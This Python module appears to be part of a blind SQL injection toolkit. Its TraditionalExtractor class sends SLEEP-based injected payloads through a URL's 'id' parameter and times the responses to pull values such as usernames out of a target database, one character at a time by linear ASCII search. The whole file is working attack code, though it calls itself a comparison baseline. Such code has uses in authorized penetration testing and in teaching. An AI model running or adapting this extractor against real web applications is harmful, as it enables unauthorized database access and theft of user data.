"""
Traditional linear search extractor for comparison.
Shows how old-school methods extract characters.
"""

from typing import Optional, List
import time
import requests
import re
from .stats import TimingAnalyzer


class TraditionalExtractor:
    """Extracts characters using linear search (traditional method)."""
    
    def __init__(self, base_url: str, payload_template: str, 
                 delay_seconds: float = 2.0, analyzer: Optional[TimingAnalyzer] = None):
        """Initialize traditional extractor."""
        self.base_url = base_url
        self.payload_template = payload_template
        self.delay_seconds = delay_seconds
        self.analyzer = analyzer or TimingAnalyzer()
        self.session = requests.Session()
        self.baseline_cache: Optional[List[float]] = None
        self.steps: List[dict] = []
        self.total_queries = 0
    
    def _measure_request_time(self, payload: str, samples: int = 3) -> List[float]:
        """Measure request timing."""
        timings = []
        if '?' in self.base_url:
            url = self.base_url.split('?')[0]
        else:
            url = self.base_url
        
        for _ in range(samples):
            start = time.time()
            try:
                self.session.get(url, params={'id': payload}, timeout=30)
            except requests.RequestException:
                pass
            timings.append(time.time() - start)
        return timings
    
    def _establish_baseline(self, samples: int = 5) -> List[float]:
        """Establish baseline timing."""
        if self.baseline_cache is not None:
            return self.baseline_cache
        
        baseline_payload = self.payload_template.format(condition="1=0")
        baseline_timings = self._measure_request_time(baseline_payload, samples)
        self.baseline_cache = baseline_timings
        return baseline_timings
    
    def _test_condition(self, condition: str) -> bool:
        """Test condition using simple threshold (traditional method)."""
        baseline = self._establish_baseline()
        baseline_avg = sum(baseline) / len(baseline) if baseline else 0
        
        # Build payload
        if "SLEEP" in self.payload_template.upper():
            payload_template = re.sub(
                r'SLEEP\([0-9.]+\)',
                f'SLEEP({self.delay_seconds})',
                self.payload_template,
                flags=re.IGNORECASE
            )
            payload = payload_template.format(condition=condition)
        else:
            payload = self.payload_template.format(
                condition=f"({condition}) AND SLEEP({self.delay_seconds})"
            )
        
        # Single test (traditional method doesn't use statistics)
        start = time.time()
        try:
            if '?' in self.base_url:
                url = self.base_url.split('?')[0]
            else:
                url = self.base_url
            self.session.get(url, params={'id': payload}, timeout=30)
        except requests.RequestException:
            pass
        elapsed = time.time() - start
        
        # Simple threshold check (traditional method)
        threshold = baseline_avg + (self.delay_seconds * 0.5)  # 50% of delay
        return elapsed > threshold
    
    def extract_character_linear(self, position: int, table: str = "users",
                                column: str = "username", where_clause: str = "1=1") -> Optional[str]:
        """Extract character using linear search (traditional method)."""
        char_query = f"UNICODE(SUBSTR((SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1), {position}, 1))"
        
        # Linear search: test each ASCII value from 32 to 126
        for ascii_val in range(32, 127):
            condition = f"{char_query} = {ascii_val}"
            
            start_time = time.time()
            result = self._test_condition(condition)
            elapsed = time.time() - start_time
            self.total_queries += 1
            
            # Record step
            self.steps.append({
                'position': position,
                'ascii_val': ascii_val,
                'condition': condition,
                'result': result,
                'timing': elapsed,
                'queries': self.total_queries
            })
            
            if result:
                return chr(ascii_val)
        
        return None
    
    def extract_string(self, table: str = "users", column: str = "username",
                      where_clause: str = "1=1", max_length: int = 100) -> str:
        """Extract string using linear search."""
        result = ""
        self.steps = []
        self.total_queries = 0
        
        for position in range(1, max_length + 1):
            char = self.extract_character_linear(position, table, column, where_clause)
            if char is None:
                break
            result += char
            print(f"[*] Traditional method - Extracted so far: {result}", end='\r')
            
            if char in ['\x00', '\n', '\r']:
                break
        
        print()
        return result.rstrip('\x00\n\r')
    
    def get_steps(self) -> List[dict]:
        """Get all extraction steps for comparison."""
        return self.steps

